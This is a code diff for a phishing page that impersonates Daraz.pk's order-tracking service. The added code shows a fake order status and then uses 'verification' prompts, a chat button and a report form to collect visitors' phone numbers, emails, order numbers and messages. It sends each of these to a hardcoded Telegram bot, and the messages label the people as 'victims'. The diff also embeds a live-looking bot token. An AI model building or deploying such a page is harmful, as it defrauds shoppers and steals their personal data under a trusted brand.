@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Daraz.pk - Order Tracking | Pakistan's No.1 Shopping Mall</title>
-    <link rel="icon" href="logo.png">
+    <link rel="icon" href="https://hk786811-wq.github.io/daraz-order-status/logo.png">
     <meta name="description" content="Track your Daraz orders instantly. Enter your order number to check delivery status.">
     <meta name="keywords" content="Daraz order tracking, Daraz delivery status, Daraz.pk, online shopping Pakistan">
     <meta name="theme-color" content="#f85606">
@@ -12,7 +12,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f85606 url('bg.jpg') no-repeat center center fixed;
+            background: #f85606 url('') no-repeat center center fixed;
             background-size: cover;
             color: white;
             min-height: 100vh;
@@ -242,6 +242,159 @@
             width: 24px;
             margin-right: 8px;
         }
+        /* Report Modal Styles */
+        #reportModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        #reportModal > div {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+        }
+        #reportModal h2 {
+            color: #f85606;
+            margin-bottom: 20px;
+        }
+        #reportModal label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        #reportModal input, #reportModal textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+        #reportModal textarea {
+            min-height: 100px;
+        }
+        #reportModal button {
+            background: #f85606;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        #reportModal button[type="button"] {
+            background: #ccc;
+            color: #333;
+            margin-left: 10px;
+        }
+        /* Fake Order Status Page Styles */
+        #orderStatusPage {
+            display: none;
+            background: #f5f5f5;
+            color: #333;
+        }
+        #orderStatusPage .header {
+            background: #f85606;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        #orderStatusPage .header .logo {
+            height: 40px;
+        }
+        #orderStatusPage .main {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+        #orderStatusPage .order-header {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        #orderStatusPage .progress-bar {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        #orderStatusPage .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 30px;
+        }
+        #orderStatusPage .progress-steps:before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: #e0e0e0;
+            z-index: 1;
+        }
+        #orderStatusPage .step {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+        }
+        #orderStatusPage .step-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+            font-weight: bold;
+        }
+        #orderStatusPage .step.active .step-icon {
+            background: #f85606;
+            color: white;
+        }
+        #orderStatusPage .step.completed .step-icon {
+            background: #4CAF50;
+            color: white;
+        }
+        #orderStatusPage .order-details {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        #orderStatusPage .contact-support {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        #orderStatusPage .contact-btn {
+            background: #f85606;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
         @media (max-width: 768px) {
             .main h1 { font-size: 28px; }
             .main p { font-size: 16px; }
@@ -251,159 +404,324 @@
     </style>
 </head>
 <body>
-    <div class="top-bar">
-        Welcome to Daraz.pk | Pakistan's Largest Online Shopping Mall | Free Delivery Nationwide
-    </div>
+    <!-- Main Tracking Page -->
+    <div id="trackingPage">
+        <div class="top-bar">
+            Welcome to Daraz.pk | Pakistan's Largest Online Shopping Mall | Free Delivery Nationwide
+        </div>
 
-    <div class="header">
-        <div class="header-container">
-            <div class="logo">
-                <img src="logo.png" alt="Daraz.pk Logo">
-            </div>
-            <div class="search-box">
-                <input type="text" id="orderInput" placeholder="Enter your Daraz order number (e.g. 12345678)">
-                <button onclick="trackOrder()">TRACK ORDER</button>
-            </div>
-            <div style="display: flex; gap: 20px; font-size: 14px;">
-                <a href="#" style="color: white; text-decoration: none;">Help Center</a>
-                <a href="#" style="color: white; text-decoration: none;">Track Order</a>
-                <a href="#" style="color: white; text-decoration: none;">Login</a>
-            </div>
-        </div>
-    </div>
-
-    <div class="main">
-        <h1>Track Your Daraz Order</h1>
-        <p>Enter your order number above to check the latest delivery status. Track your package in real-time from warehouse to your doorstep.</p>
-    </div>
-
-    <div class="features">
-        <div class="feature">
-            <img src="https://img.lazcdn.com/us/domino/ce0417bf-fd98-4778-978e-e29c3049e288_PK-150-150.png_120x120q80.png_.avif" alt="Fast Delivery">
-            <div>Fast Delivery</div>
-        </div>
-        <div class="feature">
-            <img src="https://img.lazcdn.com/us/domino/e5c3cd93-b796-410f-9bfd-fbfdaa055149_PK-144-84.png">
-            <div>Secure Payment</div>
-        </div>
-        <div class="feature">
-            <img src="https://i.ibb.co/XZ6LKxpL/24-hours-support.png" alt="24/7 Support">
-            <div>24/7 Support</div>
-        </div>
-        <div class="feature">
-            <img src="https://img.icons8.com/ios-filled/50/ffffff/return.png" alt="Easy Returns">
-            <div>Easy Returns</div>
-        </div>
-    </div>
-
-    <div class="brands">
-        <h2>Top Brands on Daraz</h2>
-        <div class="brands-grid">
-            <div class="brand-logo">
-                <img src="https://img.drz.lazcdn.com/static/pk/p/40ee9f97430eaccdfbd856f74c374baa.jpg_400x400q80.jpg_.avif" alt="iPhone">
-            </div>
-            <div class="brand-logo">
-                <img src=https://img.drz.lazcdn.com/static/pk/p/80e9dfb7d92641c17ee7099076e5e2c5.jpg_400x400q75.avif" alt=" Samsung">
-            </div>
-            <div class="brand-logo">
-                <img src="https://img.drz.lazcdn.com/static/pk/p/3dcaa24b8674ac7004495654d0331ff9.jpg_400x400q75.avif" alt="OPPO">
-            </div>
-            <div class="brand-logo">
-                <img src="https://img.drz.lazcdn.com/static/pk/p/0671fa0709dda5e877d5d7b4e2edacc9.jpg_400x400q75.avif" alt="Dawlance">
-            </div>
-            <div class="brand-logo">
-                <img src="https://img.drz.lazcdn.com/static/pk/p/b83addc7c2e1d723b86ba989d5a7d4b1.jpg_400x400q75.jpg_.webp" alt="Nike">
-            </div>
-            <div class="brand-logo">
-                <img src="https://img.drz.lazcdn.com/static/pk/p/86ec0a6f8ce0473f85706a8dd036b9ad.png_400x400q75.avif" alt="Khaadi">
-            </div>
-        </div>
-    </div>
-
-    <div class="reviews">
-        <h2>What Our Customers Say</h2>
-        <div class="reviews-grid">
-            <div class="review-card">
-                <div class="review-header">
-                    <img src="https://randomuser.me/api/portraits/men/32.jpg" class="review-avatar" alt="Customer">
-                    <div class="review-name">Ahmad K.</div>
-                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+        <div class="header">
+            <div class="header-container">
+                <div class="logo">
+                    <img src="https://hk786811-wq.github.io/daraz-order-status/logo.png" alt="Daraz.pk Logo">
                 </div>
-                <p>Got my iPhone 15 in just 2 days! Daraz delivery is super fast. Highly recommend.</p>
-            </div>
-            <div class="review-card">
-                <div class="review-header">
-                    <img src="https://randomuser.me/api/portraits/women/44.jpg" class="review-avatar" alt="Customer">
-                    <div class="review-name">Sana R.</div>
-                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                <div class="search-box">
+                    <input type="text" id="orderInput" placeholder="Enter your Daraz order number (e.g. 12345678)">
+                    <button onclick="trackOrder()">TRACK ORDER</button>
                 </div>
-                <p>The best online shopping experience in Pakistan. Easy returns and great customer service.</p>
-            </div>
-            <div class="review-card">
-                <div class="review-header">
-                    <img src="https://randomuser.me/api/portraits/men/75.jpg" class="review-avatar" alt="Customer">
-                    <div class="review-name">Ali H.</div>
-                    <div class="review-rating">⭐⭐⭐⭐</div>
+                <div style="display: flex; gap: 20px; font-size: 14px;">
+                    <a href="#" style="color: white; text-decoration: none;">Help Center</a>
+                    <a href="#" onclick="document.getElementById('reportModal').style.display='flex'; return false;" style="color: white; text-decoration: none;">Report an Issue</a>
+                    <a href="#" style="color: white; text-decoration: none;">Login</a>
                 </div>
-                <p>Ordered a washing machine and it arrived in perfect condition. Will shop again.</p>
             </div>
-            <div class="review-card">
-                <div class="review-header">
-                    <img src="https://randomuser.me/api/portraits/women/68.jpg" class="review-avatar" alt="Customer">
-                    <div class="review-name">Ayesha S.</div>
-                    <div class="review-rating">⭐⭐⭐⭐⭐</div>
+        </div>
+
+        <div class="main">
+            <h1>Track Your Daraz Order</h1>
+            <p>Enter your order number above to check the latest delivery status. Track your package in real-time from warehouse to your doorstep.</p>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <img src="https://img.lazcdn.com/us/domino/ce0417bf-fd98-4778-978e-e29c3049e288_PK-150-150.png_120x120q80.png_.avif" alt="Fast Delivery">
+                <div>Fast Delivery</div>
+            </div>
+            <div class="feature">
+                <img src="https://img.lazcdn.com/us/domino/e5c3cd93-b796-410f-9bfd-fbfdaa055149_PK-144-84.png">
+                <div>Secure Payment</div>
+            </div>
+            <div class="feature">
+                <img src="https://i.ibb.co/XZ6LKxpL/24-hours-support.png" alt="24/7 Support">
+                <div>24/7 Support</div>
+            </div>
+            <div class="feature">
+                <img src="https://img.icons8.com/ios-filled/50/ffffff/return.png" alt="Easy Returns">
+                <div>Easy Returns</div>
+            </div>
+        </div>
+
+        <div class="brands">
+            <h2>Top Brands on Daraz</h2>
+            <div class="brands-grid">
+                <div class="brand-logo">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/40ee9f97430eaccdfbd856f74c374baa.jpg_400x400q80.jpg_.avif" alt="iPhone">
                 </div>
-                <p>Daraz has the best prices in Pakistan. Found amazing deals on electronics.</p>
+                <div class="brand-logo">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/80e9dfb7d92641c17ee7099076e5e2c5.jpg_400x400q75.avif" alt="Samsung">
+                </div>
+                <div class="brand-logo">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/3dcaa24b8674ac7004495654d0331ff9.jpg_400x400q75.avif" alt="OPPO">
+                </div>
+                <div class="brand-logo">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/0671fa0709dda5e877d5d7b4e2edacc9.jpg_400x400q75.avif" alt="Dawlance">
+                </div>
+                <div class="brand-logo">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/b83addc7c2e1d723b86ba989d5a7d4b1.jpg_400x400q75.jpg_.webp" alt="Nike">
+                </div>
+                <div class="brand-logo">
+                    <img src="https://img.drz.lazcdn.com/static/pk/p/86ec0a6f8ce0473f85706a8dd036b9ad.png_400x400q75.avif" alt="Khaadi">
+                </div>
             </div>
+        </div>
+
+        <div class="reviews">
+            <h2>What Our Customers Say</h2>
+            <div class="reviews-grid">
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" class="review-avatar" alt="Customer">
+                        <div class="review-name">Ahmad K.</div>
+                        <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                    </div>
+                    <p>Got my iPhone 15 in just 2 days! Daraz delivery is super fast. Highly recommend.</p>
+                </div>
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/women/44.jpg" class="review-avatar" alt="Customer">
+                        <div class="review-name">Sana R.</div>
+                        <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                    </div>
+                    <p>The best online shopping experience in Pakistan. Easy returns and great customer service.</p>
+                </div>
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/men/75.jpg" class="review-avatar" alt="Customer">
+                        <div class="review-name">Ali H.</div>
+                        <div class="review-rating">⭐⭐⭐⭐</div>
+                    </div>
+                    <p>Ordered a washing machine and it arrived in perfect condition. Will shop again.</p>
+                </div>
+                <div class="review-card">
+                    <div class="review-header">
+                        <img src="https://randomuser.me/api/portraits/women/68.jpg" class="review-avatar" alt="Customer">
+                        <div class="review-name">Ayesha S.</div>
+                        <div class="review-rating">⭐⭐⭐⭐⭐</div>
+                    </div>
+                    <p>Daraz has the best prices in Pakistan. Found amazing deals on electronics.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="social-icons">
+                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/facebook-new.png" alt="Facebook"></a>
+                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/instagram-new--v1.png" alt="Instagram"></a>
+                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/youtube-play.png" alt="YouTube"></a>
+                <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/twitter.png" alt="Twitter"></a>
+            </div>
+            <div class="footer-links">
+                <a href="#">About Daraz</a>
+                <a href="#">Careers</a>
+                <a href="#">Daraz Blog</a>
+                <a href="#">Terms & Conditions</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Digital Payments</a>
+                <a href="#">Daraz Affiliate Program</a>
+                <a href="#">Help Center</a>
+                <a href="#" onclick="document.getElementById('reportModal').style.display='flex'; return false;">Report an Issue</a>
+                <a href="#">Returns & Refunds</a>
+                <a href="#">Daraz Mart</a>
+            </div>
+            <p style="font-size: 12px; opacity: 0.7;">© 2024 Daraz.pk. All Rights Reserved. Daraz is a registered trademark of Daraz Group.</p>
+        </div>
+
+        <div class="whatsapp-float" onclick="openChat()">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/whatsapp.png" alt="WhatsApp">
+            Chat with Daraz
         </div>
     </div>
 
-    <div class="footer">
-        <div class="social-icons">
-            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/facebook-new.png" alt="Facebook"></a>
-            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/instagram-new--v1.png" alt="Instagram"></a>
-            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/youtube-play.png" alt="YouTube"></a>
-            <a href="#"><img src="https://img.icons8.com/ios-filled/50/ffffff/twitter.png" alt="Twitter"></a>
+    <!-- Fake Order Status Page -->
+    <div id="orderStatusPage">
+        <div class="header">
+            <img src="https://i.ibb.co/3k5fX2G/daraz-logo.png" class="logo" alt="Daraz Logo">
+            <a href="#" onclick="document.getElementById('orderStatusPage').style.display='none'; document.getElementById('trackingPage').style.display='block';" style="color: white; text-decoration: none;">Back to Tracking</a>
         </div>
-        <div class="footer-links">
-            <a href="#">About Daraz</a>
-            <a href="#">Careers</a>
-            <a href="#">Daraz Blog</a>
-            <a href="#">Terms & Conditions</a>
-            <a href="#">Privacy Policy</a>
-            <a href="#">Digital Payments</a>
-            <a href="#">Daraz Affiliate Program</a>
-            <a href="#">Help Center</a>
-            <a href="#">Track My Order</a>
-            <a href="#">Returns & Refunds</a>
-            <a href="#">Daraz Mart</a>
+
+        <div class="main">
+            <div class="order-header">
+                <h1 id="orderNumberTitle">Order #12345678</h1>
+                <p id="orderDate">Placed on 15 May 2024</p>
+                <div class="status">Delivery in Progress</div>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-steps">
+                    <div class="step completed">
+                        <div class="step-icon">✓</div>
+                        <div class="step-label">Order Placed</div>
+                    </div>
+                    <div class="step completed">
+                        <div class="step-icon">✓</div>
+                        <div class="step-label">Processing</div>
+                    </div>
+                    <div class="step active">
+                        <div class="step-icon">🚚</div>
+                        <div class="step-label">Shipped</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon">📦</div>
+                        <div class="step-label">Delivered</div>
+                    </div>
+                </div>
+                <p style="text-align: center; color: #666; font-size: 14px;">
+                    Your order is out for delivery. Estimated delivery: <strong id="estimatedDate">17 May 2024</strong>
+                </p>
+            </div>
+
+            <div class="order-details">
+                <h2>Order Information</h2>
+                <div class="detail-row">
+                    <div class="label">Order Number:</div>
+                    <div class="value" id="orderNumberValue">12345678</div>
+                </div>
+                <div class="detail-row">
+                    <div class="label">Order Date:</div>
+                    <div class="value" id="orderDateValue">15 May 2024</div>
+                </div>
+                <div class="detail-row">
+                    <div class="label">Payment Method:</div>
+                    <div class="value">Cash on Delivery</div>
+                </div>
+                <div class="detail-row">
+                    <div class="label">Delivery Address:</div>
+                    <div class="value" id="deliveryAddress">House #123, Street 45, G-11/2, Islamabad</div>
+                </div>
+            </div>
+
+            <div class="contact-support">
+                <h2>Need to Change Delivery Address?</h2>
+                <p>Contact Daraz Support immediately to update your delivery details.</p>
+                <button class="contact-btn" onclick="contactSupport()">CONTACT SUPPORT</button>
+            </div>
         </div>
-        <p style="font-size: 12px; opacity: 0.7;">© 2024 Daraz.pk. All Rights Reserved. Daraz is a registered trademark of Daraz Group.</p>
+
+        <div class="footer" style="background: rgba(0,0,0,0.7); color: #ccc;">
+            © 2024 Daraz.pk. All Rights Reserved
+        </div>
     </div>
 
-    <div class="whatsapp-float" onclick="openChat()">
-        <img src="https://img.icons8.com/ios-filled/50/ffffff/whatsapp.png" alt="WhatsApp">
-        Chat with Daraz
+    <!-- Report Issue Modal -->
+    <div id="reportModal">
+        <div>
+            <h2>Report an Issue</h2>
+            <form onsubmit="submitReport(event)">
+                <div>
+                    <label>Order Number</label>
+                    <input type="text" id="reportOrder" required>
+                </div>
+                <div>
+                    <label>Issue Description</label>
+                    <textarea id="reportIssue" required></textarea>
+                </div>
+                <div>
+                    <label>Your Email</label>
+                    <input type="email" id="reportEmail" required>
+                </div>
+                <button type="submit">Submit Report</button>
+                <button type="button" onclick="document.getElementById('reportModal').style.display='none'">Cancel</button>
+            </form>
+        </div>
     </div>
 
     <script>
+        // Telegram Bot Configuration (REPLACE THESE)
+        const TELEGRAM_BOT_TOKEN = "8612019166:AAG_D9Uw1Oz7-CdCM6vg3RQpi7MhUmtBDAc";
+        const TELEGRAM_CHAT_ID = "5748964940";
+
+        // Track Order Function
         function trackOrder() {
             const orderNumber = document.getElementById("orderInput").value.trim();
             if (!orderNumber) {
                 alert("Please enter a valid order number");
                 return;
             }
-            // Redirect to orderNumber/index.html (e.g., 12345/index.html)
-            window.location.href = orderNumber + "/";
+
+            // Show fake order status page
+            document.getElementById("trackingPage").style.display = "none";
+            document.getElementById("orderStatusPage").style.display = "block";
+
+            // Fill dynamic data
+            const orderDate = new Date().toLocaleDateString('en-GB', {
+                day: '2-digit', month: 'short', year: 'numeric'
+            });
+            const estimatedDate = new Date();
+            estimatedDate.setDate(estimatedDate.getDate() + 2);
+            const estimatedDelivery = estimatedDate.toLocaleDateString('en-GB', {
+                day: '2-digit', month: 'short', year: 'numeric'
+            });
+
+            // Fake addresses
+            const addresses = [
+                "House #123, Street 45, G-11/2, Islamabad",
+                "Flat 302, Block C, DHA Phase 5, Lahore",
+                "Shop 15, Al-Rehman Market, Karachi",
+                "Villa 7, Bahria Town, Rawalpindi"
+            ];
+            const randomAddress = addresses[Math.floor(Math.random() * addresses.length)];
+
+            // Update UI
+            document.getElementById("orderNumberTitle").textContent = `Order #${orderNumber}`;
+            document.getElementById("orderNumberValue").textContent = orderNumber;
+            document.getElementById("orderDate").textContent = `Placed on ${orderDate}`;
+            document.getElementById("orderDateValue").textContent = orderDate;
+            document.getElementById("estimatedDate").textContent = estimatedDelivery;
+            document.getElementById("deliveryAddress").textContent = randomAddress;
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
+                encodeURIComponent(`🚨 NEW ORDER TRACKED 🚨\n\nOrder: ${orderNumber}\nDate: ${orderDate}\nAddress: ${randomAddress}`));
         }
 
+        // WhatsApp Chat Function
         function openChat() {
             const phone = prompt("Daraz Support: Please verify your phone number to continue chat.\n\nEnter your number (e.g. 03001234567):");
             if (phone) {
-                // Send to your Telegram bot (replace with your bot token)
-                fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=" + encodeURIComponent("New Victim: " + phone));
-                alert("Thank you! Our agent will contact you shortly on " + phone + " regarding your order.");
+                // Send to Telegram
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
+                    encodeURIComponent(`📱 WHATSAPP VICTIM 📱\n\nPhone: ${phone}`));
+
+                alert(`Thank you! Our agent will contact you shortly on ${phone} regarding your order.`);
             }
+        }
+
+        // Contact Support Function (Fake Email Capture)
+        function contactSupport() {
+            const email = prompt("⚠️ IMPORTANT: Due to high delivery volume, we need to verify your identity.\n\nPlease enter your EMAIL ADDRESS to proceed with support:");
+            if (email) {
+                // Send to Telegram
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
+                    encodeURIComponent(`📧 EMAIL CAPTURED 📧\n\nEmail: ${email}`));
+
+                alert(`✅ Verification Email Sent!\n\nWe've sent a verification link to ${email}.\nPlease click the link to connect with Daraz Support.\n\nNote: If you don't see the email, check your spam folder.`);
+            }
+        }
+
+        // Report Issue Function
+        function submitReport(e) {
+            e.preventDefault();
+            const order = document.getElementById('reportOrder').value;
+            const issue = document.getElementById('reportIssue').value;
+            const email = document.getElementById('reportEmail').value;
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=` +
+                encodeURIComponent(`📝 REPORT SUBMITTED 📝\n\nOrder: ${order}\nEmail: ${email}\nIssue: ${issue}`));
+
+            alert("Thank you! Your report has been submitted. Daraz Support will contact you shortly.");
+            document.getElementById('reportModal').style.display = 'none';
+            e.target.reset();
         }
     </script>
 </body>
